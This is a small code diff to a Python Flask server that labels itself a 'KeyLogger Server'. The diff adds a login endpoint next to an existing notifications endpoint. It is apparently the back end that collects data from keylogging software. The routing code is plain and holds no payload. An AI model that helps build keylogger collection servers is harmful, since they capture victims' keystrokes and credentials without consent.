@@ -9,6 +9,10 @@ CORS(app)
 def home():
     return "KeyLogger Server is Running"
 
+@app.post("/api/login")
+def login():
+    return controllers.handle_login(request)
+
 @app.post("/api/notifications")
 def notifications():
     return controllers.handle_notifications(request)
